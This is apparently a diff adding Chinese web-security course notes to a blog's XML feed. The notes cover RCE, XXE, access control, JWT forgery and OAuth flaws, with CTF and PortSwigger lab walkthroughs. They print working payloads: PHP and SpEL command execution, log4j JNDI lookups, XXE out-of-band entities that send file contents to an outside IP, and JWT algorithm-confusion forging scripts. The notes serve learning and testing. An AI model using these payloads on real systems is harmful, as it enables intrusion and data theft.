@@ -4838,4 +4838,341 @@ fclose($myfile);
         <tag>笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>第73天--RCE&amp;代码执行&amp;命令执行&amp;无回显方案&amp;语言表达式&amp;黑盒功能点&amp;白盒方法名</title>
+    <url>/2026/09/28/%E7%AC%AC73%E5%A4%A9-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%96%B9%E6%A1%88-%E8%AF%AD%E8%A8%80%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9-%E7%99%BD%E7%9B%92%E6%96%B9%E6%B3%95%E5%90%8D/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-RCE-代码执行&amp;命令执行</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-RCE-回显&amp;功能点&amp;引发链</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<p><font style="color:#9a6e3a;"></font><font style="color:#000000;">RCE代码执行：引用脚本代码解析执行</font></p>
+<p>RCE命令执行：脚本调用操作系统命令</p>
+<h1 id="一、漏洞函数"><a href="#一、漏洞函数" class="headerlink" title="一、漏洞函数"></a>一、漏洞函数</h1><p>1.PHP：</p>
+<p>PHP代码执行函数：</p>
+<p>eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等</p>
+<p>PHP命令执行函数：</p>
+<p>system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等</p>
+<p>2.Python：</p>
+<p>evalexec subprocess os.system commands等</p>
+<p>3.Java：</p>
+<p>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</p>
+<p><font style="background-color:#FBDE28;">php的某些函数在执行的时候会自动启动shell</font></p>
+<p><font style="background-color:#FBDE28;">java它是没有函数会自动启动shell，执行单个命令，如：whoami，直接告诉操作系统，操作系统自动执行对应命令文件。但是只要用到; | &gt;等符号，操作系统看不懂符号，这些语法是shell程序自己实现的功能，需手动开启shell。</font></p>
+<p><font style="background-color:#FBDE28;">OGNL struts框架自带，只要命令执行自动打开shell</font></p>
+<p><font style="background-color:#FBDE28;">SPEL spring框架自带。SPEL很老实我写什么直接交给原生java执行，不加任何处理</font></p>
+<p><font style="background-color:#FBDE28;">MVEL 老OA才用和SPEL一样</font></p>
+<p>RCE-代码执行</p>
+<p>功能点举例：在线编程</p>
+<p>RCE-命令执行</p>
+<p>功能点举例：系统面板</p>
+<p>RCE-Java&amp;PHP</p>
+<p>SPEL：（功能点举例：评论解析）</p>
+<p>comment&#x3D;T(java.lang.Runtime).getRuntime().exec(‘calc’)</p>
+<p>其他漏洞引发链</p>
+<p>注入，文件包含，文件上传，反序列化等引发。大多数命令执行都是其他漏洞引发</p>
+<p>有回显&amp;无回显</p>
+<p>1、直接写个文件访问查看</p>
+<p>2、直接进行对外访问接受</p>
+<p>黑盒案例</p>
+<p>代码在线运行平台测试</p>
+<h1 id="二、白盒CTF"><a href="#二、白盒CTF" class="headerlink" title="二、白盒CTF"></a>二、白盒CTF</h1><p>29-通配符</p>
+<p>system(‘tac fla*.php’);</p>
+<p>30-取代函数&amp;通配符&amp;管道符</p>
+<p><code>cp fla*.ph*2.txt</code>;</p>
+<p>echo shell_exec(‘tac fla*.ph*’);</p>
+<p>31-参数逃逸</p>
+<p>eval($_GET[1]);&amp;1&#x3D;system(‘tac flag.php’);</p>
+<p>32~36-配合包含&amp;伪协议</p>
+<p>include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac flag.php');?></p>
+<p>include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>37~39-包含RCE&amp;伪协议&amp;通配符</p>
+<p>data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac fla*');?></p>
+<p>php:&#x2F;&#x2F;input post:<?php system('tac flag.php');?></p>
+<h1 id="三、拓展：log4j2远程命令执行"><a href="#三、拓展：log4j2远程命令执行" class="headerlink" title="三、拓展：log4j2远程命令执行"></a>三、拓展：log4j2远程命令执行</h1><p>参考：<a href="https://blog.csdn.net/Bossfrank/article/details/130148819">https://blog.csdn.net/Bossfrank/article/details/130148819</a></p>
+<p><a href="https://blog.csdn.net/Bossfrank/article/details/130148819">https://blog.csdn.net/Bossfrank/article/details/130148819</a></p>
+<p>log4j2自带lookup表达式解析功能，日志中${xxx}格式内容会被自动解析执行。攻击者传入${jndi:ldap:&#x2F;&#x2F;攻击ip:端口&#x2F;exp},服务器打印日志时触发解析，主动出站连接攻击者的LDAP服务器，恶意服务器返回远程Java类地址，目标下载并加载class文件，执行文件实现RCE</p>
+<p>JNDI：java自带接口（同一调用入口），不是协议，无端口</p>
+<p>LDAP：网络通讯协议，标准端口389，实战复现常用1389</p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第72天-XML&amp;XXE&amp;上传解析&amp;文件预览&amp;接口服务&amp;白盒审计&amp;应用功能&amp;SRC复盘</title>
+    <url>/2026/09/28/%E7%AC%AC72%E5%A4%A9-XML-XXE-%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90-%E6%96%87%E4%BB%B6%E9%A2%84%E8%A7%88-%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1-%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1-%E5%BA%94%E7%94%A8%E5%8A%9F%E8%83%BD-SRC%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+
+<p>#黑盒功能点案例</p>
+<p>1、不安全的图像读取-SVG</p>
+<p>2、不安全的文档转换-DOCX</p>
+<p>3、不安全的传递服务-SOAP</p>
+<p>不管是上传还是文件操作，xxe影响的文件的格式后缀要知道有哪几种</p>
+<p>#白盒函数点案例：</p>
+<p>1、漏洞函数simplexml_load_string</p>
+<p>2、pe_getxml函数调用了漏洞函数</p>
+<p>3、wechat_getxml调用了pe_getxml</p>
+<p>4、notify_url调用了wechat_getxml</p>
+<p>访问notify_url文件触发wechat_getxml函数,构造Paylod测试</p>
+<p>先尝试读取文件，无回显后带外测试：</p>
+<?xml version="1.0" ?>
+
+<!DOCTYPE test [
+
+<!ENTITY % file SYSTEM "http://1uwlwv.dnslog.cn">
+
+<p>%file;</p>
+<p>]&gt;</p>
+<p><root>&send;</root></p>
+<p>然后带外传递数据解决无回显：</p>
+<?xml version="1.0"?>
+
+<!DOCTYPE ANY[
+
+<!ENTITY % file SYSTEM "file:///d:/1.txt">
+
+<!ENTITY % remote SYSTEM "http://47.94.236.117/test.dtd">
+
+<p>%remote;</p>
+<p>%all;</p>
+<p>]&gt;</p>
+<p><root>&send;</root></p>
+<p>test.dtd：</p>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'><p>“&gt;</p>
+<p>#实际复盘：</p>
+<p><a href="https://xz.aliyun.com/news/16463">https://xz.aliyun.com/news/16463</a></p>
+<p><a href="https://mp.weixin.qq.com/s/biQgwMU2v1I92CsDOFRB7g">https://mp.weixin.qq.com/s/biQgwMU2v1I92CsDOFRB7g</a></p>
+<p><a href="https://mp.weixin.qq.com/s/1pj9sbwKT6RjIiLgNC7-Gg">https://mp.weixin.qq.com/s/1pj9sbwKT6RjIiLgNC7-Gg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/Mgd91_Iie-wZU7MqP5oCXw">https://mp.weixin.qq.com/s/Mgd91_Iie-wZU7MqP5oCXw</a></p>
+<p><font style="color:#000000;"><a href="https://xz.aliyun.com/news/16463">https://xz.aliyun.com/news/16463</a></font></p>
+<p><font style="color:#000000;"><a href="https://mp.weixin.qq.com/s/biQgwMU2v1I92CsDOFRB7g">https://mp.weixin.qq.com/s/biQgwMU2v1I92CsDOFRB7g</a></font></p>
+<p><font style="color:#000000;"><a href="https://mp.weixin.qq.com/s/1pj9sbwKT6RjIiLgNC7-Gg">https://mp.weixin.qq.com/s/1pj9sbwKT6RjIiLgNC7-Gg</a></font></p>
+<p><font style="color:#000000;"><a href="https://mp.weixin.qq.com/s/Mgd91_Iie-wZU7MqP5oCXw">https://mp.weixin.qq.com/s/Mgd91_Iie-wZU7MqP5oCXw</a></font></p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第79天-访问控制篇&amp;水平越权&amp;垂直越权&amp;未授权访问&amp;级别架构&amp;项目插件&amp;SRC复盘</title>
+    <url>/2026/09/28/%E7%AC%AC79%E5%A4%A9-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%AF%87-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E7%BA%A7%E5%88%AB%E6%9E%B6%E6%9E%84-%E9%A1%B9%E7%9B%AE%E6%8F%92%E4%BB%B6-SRC%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-业务逻辑-越权&amp;访问控制&amp;检测项目</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<p><font style="color:#990055;">1</font>、水平越权：同级别的用户之间权限的跨越</p>
+<p>2、垂直越权：低级别用户到高级别用户权限的跨越</p>
+<p>3、未授权访问：通过无级别用户能访问到需验证应用</p>
+<h1 id="一、实验："><a href="#一、实验：" class="headerlink" title="一、实验："></a>一、实验：</h1><p><a href="https://portswigger.net/web-security/all-labs#access-control-vulnerabilities">https://portswigger.net/web-security/all-labs#access-control-vulnerabilities</a></p>
+<p>未授权访问（访问控制不当）：</p>
+<p>实验室：不受保护的管理功能和不可预测的URL</p>
+<p>实验室：由请求参数控制的用户角色</p>
+<p>测试：删除凭据访问；未知提取或泄露的URL访问等</p>
+<p>水平越权：</p>
+<p>实验室：由请求参数控制的用户ID</p>
+<p>实验室：用户ID由请求参数控制，用户ID不可预测</p>
+<p>测试：用户A凭据测试用户B的功能，参数值修改指向等</p>
+<p><font style="color:#2F8EF4;">如果id不是有规律的数字，我们就可以看其他功能点有没有可能泄露其他用户的id。</font></p>
+<p>垂直越权：</p>
+<p>实验室：可以在用户配置文件中修改用户角色</p>
+<p>实验：请求参数控制用户ID并泄露密码</p>
+<p>测试：用户A凭据测试高级别用户的功能，参数值修改指向等</p>
+<p>挖掘总结：</p>
+<p>关注到URL及参数数据，找到所有和用户相关的参数名和参数值提交测试</p>
+<p>涉及到JS中提取URL或数据，在返回包中提取参数名和参数值，FUZZ技术等</p>
+<h1 id="二、检测项目"><a href="#二、检测项目" class="headerlink" title="二、检测项目"></a>二、检测项目</h1><p><a href="https://github.com/smxiazi/xia_Yue">https://github.com/smxiazi/xia_Yue</a></p>
+<p><a href="https://github.com/Ed1s0nZ/PrivHunterAI">https://github.com/Ed1s0nZ/PrivHunterAI</a></p>
+<p><a href="https://github.com/WuliRuler/AutorizePro">https://github.com/WuliRuler/AutorizePro</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第80天-身份验证篇&amp;JWT令牌&amp;空密钥&amp;未签名&amp;密钥爆破&amp;JWK&amp;JWU&amp;KID&amp;算法替换</title>
+    <url>/2026/09/28/%E7%AC%AC80%E5%A4%A9-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%AF%87-JWT%E4%BB%A4%E7%89%8C-%E7%A9%BA%E5%AF%86%E9%92%A5-%E6%9C%AA%E7%AD%BE%E5%90%8D-%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4-JWK-JWU-KID-%E7%AE%97%E6%B3%95%E6%9B%BF%E6%8D%A2/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+
+
+
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-1.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-2.png"></p>
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-JWT令牌-组成&amp;识别&amp;检测&amp;安全</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-JWT令牌-空算法&amp;未签名&amp;爆破密钥</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-JWT令牌-JWK&amp;JWU&amp;KID&amp;加密替换</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<h1 id="一、JWT介绍"><a href="#一、JWT介绍" class="headerlink" title="一、JWT介绍"></a>一、JWT介绍</h1><p>JSON Web Token(JWT)。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。</p>
+<h2 id="1、JWT识别"><a href="#1、JWT识别" class="headerlink" title="1、JWT识别"></a>1、JWT识别</h2><p>1、标头（Header）</p>
+<p>Header是JWT的第一个部分，是一个JSON对象，主要声明了JWT的签名算法，如”HS256”、”RS256”等，以及其他可选参数，如”kid”、”jku”、”x5u”等</p>
+<p>alg字段通常用于表示加密采用的算法。如”HS256”、”RS256”等</p>
+<p>typ字段通常用于表示类型</p>
+<p>还有一些其他可选参数，如”kid”、”jku”、”jwk”等</p>
+<h2 id="2、有效载荷（Payload）"><a href="#2、有效载荷（Payload）" class="headerlink" title="2、有效载荷（Payload）"></a>2、有效载荷（Payload）</h2><p>Payload是JWT的第二个部分，这是一个JSON对象，主要承载了各种声明并传递明文数据，用于存储用户的信息，如id、用户名、角色、令牌生成时间和其他自定义声明。</p>
+<p>iss：该字段表示jwt的签发者。</p>
+<p>sub：该jwt面向的用户。</p>
+<p>aud：jwt的接收方。</p>
+<p>exp：jwt的过期时间,通常来说是一个时间戳。</p>
+<p>iat：jwt的签发时间,常来说是一个时间戳。</p>
+<p>jti：此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。使用这种方式防止重放攻击似乎让jwt有点怪怪的感觉, 毕竟jwt所宣称的优点就是无状态访问</p>
+<h2 id="3、签名（Signature）"><a href="#3、签名（Signature）" class="headerlink" title="3、签名（Signature）"></a>3、签名（Signature）</h2><p>Signature是对Header和Payload进行签名，具体是用什么加密方式写在Header的alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。</p>
+<p>对Header和Payload进行签名，具体是用什么加密方式写在Header的alg中。</p>
+<p>同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。</p>
+<p><font style="color:#2F8EF4;">后端就是通过第三部分来验证身份的，重新做一遍加密运算然后和第三部分进行对比，一样通过，反之不通过。</font></p>
+<p>第一部分：对 JSON 的头部做 base64 编码处理得到</p>
+<p>第二部分：对 JSON 类型的 payload 做 base64 编码处理得到</p>
+<p>第三部分：分别对头部和载荷做base64编码，并使用.拼接起来</p>
+<p>使用头部声明的加密方式，对base64编码前两部分合并的结果加盐加密处理，作为JWT</p>
+<p>HS256：对称性加密（同一的密钥加密和解密） 可以采用爆破密钥攻击</p>
+<p>RS256：非对称性加密（公钥和私钥，私钥解密或加密，公钥加密或解密）</p>
+<h1 id="二、识别检测利用项目："><a href="#二、识别检测利用项目：" class="headerlink" title="二、识别检测利用项目："></a>二、识别检测利用项目：</h1><p>BURP插件：Hae&amp;JSON Web Tokens解jwt&amp;JWT Editor生成密钥</p>
+<p><a href="https://jwt.io/">https://jwt.io/</a></p>
+<p><a href="https://github.com/z-bool/Venom-JWT">https://github.com/z-bool/Venom-JWT</a></p>
+<p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a> 密钥爆破</p>
+<p><a href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a></p>
+<p><a href="https://github.com/CompassSecurity/jwt-scanner">https://github.com/CompassSecurity/jwt-scanner</a></p>
+<h1 id="三、实验"><a href="#三、实验" class="headerlink" title="三、实验"></a>三、实验</h1><p>参考：blog.csdn.net&#x2F;weixin_44288604&#x2F;article&#x2F;details&#x2F;128562796</p>
+<h2 id="1、实验室：通过未验证的签名绕过JWT身份验证"><a href="#1、实验室：通过未验证的签名绕过JWT身份验证" class="headerlink" title="1、实验室：通过未验证的签名绕过JWT身份验证"></a>1、实验室：通过未验证的签名绕过JWT身份验证</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-3.png"></p>
+<p>按照给的账号密码登进去就能看到身份验证使用了jwt，但是这关后端是没有校验签名而是直接看payload里的值，所以我们直接sub的值改成administrator即可越权访问&#x2F;admin。</p>
+<h2 id="2、实验室：通过有缺陷的签名验证绕过JWT身份验证"><a href="#2、实验室：通过有缺陷的签名验证绕过JWT身份验证" class="headerlink" title="2、实验室：通过有缺陷的签名验证绕过JWT身份验证"></a>2、实验室：通过有缺陷的签名验证绕过JWT身份验证</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-4.png"></p>
+<p>这个就是后端没写死算法，而是看alg的值来用对应算法，所以直接算法置空，也没有验证签名了，直接看payload值</p>
+<h2 id="3、实验室：通过弱签名密钥绕过JWT身份验证"><a href="#3、实验室：通过弱签名密钥绕过JWT身份验证" class="headerlink" title="3、实验室：通过弱签名密钥绕过JWT身份验证"></a>3、实验室：通过弱签名密钥绕过JWT身份验证</h2><p>这个用上面的方法不行，但是观察到用的是SH256对称加密，那么就尝试密钥爆破，使用jwt-tool。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-5.png"></p>
+<p>因为密钥是弱密钥所以可以爆破，爆破后那就随便搞了。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-6.png"></p>
+<h2 id="4、实验室：通过jwk标头注入绕过JWT身份验证"><a href="#4、实验室：通过jwk标头注入绕过JWT身份验证" class="headerlink" title="4、实验室：通过jwk标头注入绕过JWT身份验证"></a><font style="color:#DF2A3F;">4、实验室：通过jwk标头注入绕过JWT身份验证</font></h2><p><font style="color:#2F8EF4;">位置：</font><font style="color:#2F8EF4;background-color:rgba(0, 0, 0, 0);">JWT Header 头部字段</font><font style="color:#2F8EF4;">，多用于 RS256 非对称验签，作用是给服务端提供验签公钥， 直接将公钥嵌入 JWT 头部。我们在jwt-editor新建一个rsa密钥，私钥保存在bp的缓存中，公钥插件把它转换成jwk格式，放到header中，用我们自己的私钥签发，公钥验签当然能绕过了！</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-7.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-8.png"></p>
+<h2 id="5、实验室：通过jku标头注入绕过JWT身份验证"><a href="#5、实验室：通过jku标头注入绕过JWT身份验证" class="headerlink" title="5、实验室：通过jku标头注入绕过JWT身份验证"></a><font style="color:#DF2A3F;">5、实验室：通过jku标头注入绕过JWT身份验证</font></h2><p><font style="color:#2F8EF4;background-color:rgba(0, 0, 0, 0);">JWT Header 头部字段</font><font style="color:#2F8EF4;">，多用于 RS256 非对称验签，作用是给服务端提供验签公钥， 存放 JWKS 密钥集的 URL 地址。这个和上面一个是一样的，只是从远程加载公钥而已。一样的操作，创建rsa密钥，然后复制到远程服务器，然后header加jku后面跟url，然后即可</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-9.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-10.png"></p>
+<h2 id="6、实验室：通过kid头路径遍历绕过JWT身份验证"><a href="#6、实验室：通过kid头路径遍历绕过JWT身份验证" class="headerlink" title="6、实验室：通过kid头路径遍历绕过JWT身份验证"></a><font style="color:#DF2A3F;">6、实验室：通过kid头路径遍历绕过JWT身份验证</font></h2><p>kid值就是密钥的一个编号，因为可能不用业务用的签发密钥不同，验签的时候也要用对应密钥，只针对对称算法。后端没写死密钥，而是把kid值作为路径了。目录穿越去访问dev&#x2F;null这是一个空文件，所以签发验签都是空密钥就绕过了。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/080-11.png"></p>
+<h2 id="7、算法混淆"><a href="#7、算法混淆" class="headerlink" title="7、算法混淆"></a>7、算法混淆</h2><h3 id="1、ctfshow-Web349（公钥私钥泄露）"><a href="#1、ctfshow-Web349（公钥私钥泄露）" class="headerlink" title="1、ctfshow-Web349（公钥私钥泄露）"></a>1、ctfshow-Web349（公钥私钥泄露）</h3><p><font style="color:#2F8EF4;">这个就是私钥泄露了，写个脚本去把user值改了</font></p>
+<p>pip install PyJWT&#x3D;&#x3D;1.7.1</p>
+<p>import jwt</p>
+<p>public&#x3D;open(‘private.key’,’r’).read()</p>
+<p>payload&#x3D;{“user”:”admin”}</p>
+<p>print(jwt.encode(payload, key&#x3D;public, algorithm&#x3D;’RS256’))</p>
+<h3 id="2、ctfshow-Web350-密钥混淆攻击RS256-HS256"><a href="#2、ctfshow-Web350-密钥混淆攻击RS256-HS256" class="headerlink" title="2、ctfshow-Web350(密钥混淆攻击RS256&#x3D;&gt;HS256)"></a>2、ctfshow-Web350(密钥混淆攻击RS256&#x3D;&gt;HS256)</h3><p><font style="color:#2F8EF4;">这个和上面的空密钥绕过很像，都是后端没有写死算法。这里就是它这次没有泄露私钥，我们无法伪造jwt，但是我们可以改成HS256对称加密，加密解密都是一个密钥，所以全程不用获得密钥就能伪造。</font></p>
+<p>将RS256算法改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）</p>
+<p>HS256算法使用密钥为所有消息进行签名和验证。</p>
+<p>而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</p>
+<p>var jwt &#x3D;require(‘jsonwebtoken’);</p>
+<p>var fs &#x3D;require(‘fs’);</p>
+<p>var privateKey &#x3D; fs.readFileSync(‘.&#x2F;public.key’);</p>
+<p>var token &#x3D; jwt.sign({ user:’admin’}, privateKey,{ algorithm:’HS256’});</p>
+<p>console.log(token)</p>
+<h2 id="8、某个测试目标"><a href="#8、某个测试目标" class="headerlink" title="8、某个测试目标"></a>8、某个测试目标</h2><p>参考：<a href="https://mp.weixin.qq.com/s/obiU3BaFoZ7272z2vS0QgQ">https://mp.weixin.qq.com/s/obiU3BaFoZ7272z2vS0QgQ</a></p>
+<p>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MDcyNjE1MzE0fQ.mwI2P1j8CIvhxBKFvcyU7TNLBeuFtiUM1mPrKanF1w4</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>db&#x3D;sample&amp;q&#x3D;show users</p>
+<p>复盘：</p>
+<p><a href="https://mp.weixin.qq.com/s/ITVFuQpA8OCIRj4wW-peAA">https://mp.weixin.qq.com/s/ITVFuQpA8OCIRj4wW-peAA</a></p>
+<p><a href="https://mp.weixin.qq.com/s/xuY1oTwFcM1pyiql0U3NPQ">https://mp.weixin.qq.com/s/xuY1oTwFcM1pyiql0U3NPQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s/AVW8DsnLiviopeJYQYKC3A">https://mp.weixin.qq.com/s/AVW8DsnLiviopeJYQYKC3A</a></p>
+<p><a href="https://mp.weixin.qq.com/s/st0xma6KoRbo1NUp9rtZhw">https://mp.weixin.qq.com/s/st0xma6KoRbo1NUp9rtZhw</a></p>
+<p><a href="https://mp.weixin.qq.com/s/9OL5jZK7S1MiEUb8Q_F1Pw">https://mp.weixin.qq.com/s/9OL5jZK7S1MiEUb8Q_F1Pw</a></p>
+<p>首先找到需要JWT鉴权后才能访问的页面，如个人资料页面，将请求重放测试：</p>
+<p>1）未授权访问：删除Token后仍然可以正常响应对应页面</p>
+<p>2）敏感信息泄露：通过JWt.io解密出Payload后查看其中是否包含敏感信息，如弱加密的密码等</p>
+<p>3）破解密钥+越权访问：通过JWT.io解密出Payload部分内容，通过空加密算法或密钥爆破等方式实现重新签发Token并修改Payload部分内容，重放请求包，观察响应包是否能够越权查看其他用户资料</p>
+<p>4）检查Token时效性：解密查看payload中是否有exp字段键值对（Token过期时间），等待过期时间后再次使用该Token发送请求，若正常响应则存在Token不过期</p>
+<p>5）通过页面回显进行探测：如修改Payload中键值对后页面报错信息是否存在注入，payload中kid字段的目录遍历问题与sql注入问题</p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第81天-身份验证篇&amp;OAuth认证&amp;授权分类及参数&amp;重定向接管&amp;State缺陷&amp;Scope篡改</title>
+    <url>/2026/09/28/%E7%AC%AC81%E5%A4%A9-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%AF%87-OAuth%E8%AE%A4%E8%AF%81-%E6%8E%88%E6%9D%83%E5%88%86%E7%B1%BB%E5%8F%8A%E5%8F%82%E6%95%B0-%E9%87%8D%E5%AE%9A%E5%90%91%E6%8E%A5%E7%AE%A1-State%E7%BC%BA%E9%99%B7-Scope%E7%AF%A1%E6%94%B9/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-OAuth认证-授权逻辑&amp;授权分类&amp;参数解释</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-OAuth认证-无State&amp;重定向接管&amp;篡改Scope</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<h1 id="一、解释"><a href="#一、解释" class="headerlink" title="一、解释"></a>一、解释</h1><p>OAuth：一种常用的授权框架，它允许网站和Web应用程序请求对另一个应用程序上的用户帐户的有限访问权限，像那种允许使用第三方账号（QQ、微信等）登录的网站，可能就是使用的OAuth框架。</p>
+<h1 id="二、类型"><a href="#二、类型" class="headerlink" title="二、类型"></a>二、类型</h1><p>授权类型：授权码模式，隐式授权类型等</p>
+<p><font style="color:#2F8EF4;">这两种就简单理解授权码模式看不到token，隐式授权能看到token，前者安全一点</font></p>
+<p>参考：</p>
+<p><a href="https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A">https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A</a></p>
+<p><a href="https://mp.weixin.qq.com/s/ATjdIxSOruY-_lCCs2kcGg">https://mp.weixin.qq.com/s/ATjdIxSOruY-_lCCs2kcGg</a></p>
+<p><font style="color:#2F8EF4;">state为什么能防止csrf，攻击者发来的攻击链接比如state等于abc，当受害者访问后，虽然url里是abc，但是code生成的同时，会生成对应的session，这里受害者code值和session值对不上，拒绝访问</font></p>
+<h1 id="三、靶场"><a href="#三、靶场" class="headerlink" title="三、靶场"></a>三、靶场</h1><p>1、OAuth隐式认证绕过</p>
+<p>2、注册资源SSRF被利用</p>
+<p>这两个过时了就不浪费时间了</p>
+<h2 id="3、存在CSRF缺陷用户被绑定-无state"><a href="#3、存在CSRF缺陷用户被绑定-无state" class="headerlink" title="3、存在CSRF缺陷用户被绑定 无state"></a><font style="color:#DF2A3F;">3、存在CSRF缺陷用户被绑定 无state</font></h2><p>这个实验的原理是，我们可以通过账号密码来登录账号，同时也能绑定第三方来登录（如：wx、qq）。我们想授权服务器发送请求的时候看到无state，然后服务器会返回一个code，我们把这个过程的url放到攻击服务器上，当攻击者访问这个攻击网站，会把我们的第三方应用权限绑到受害者账户，然后用第三方应用登录的时候就登录到受害者账号。<font style="color:#2F8EF4;">这个就是因为返回授权码的url没有state参数，所以导致随便绑定</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/081-1.png"></p>
+<h2 id="4、CSRF缺陷redirect-uri劫持code"><a href="#4、CSRF缺陷redirect-uri劫持code" class="headerlink" title="4、CSRF缺陷redirect_uri劫持code"></a><font style="color:#DF2A3F;">4、CSRF缺陷redirect_uri劫持code</font></h2><p>这个就是改redirect_url的值，改为攻击网站，攻击网站写</p>
+<p>:::info</p>
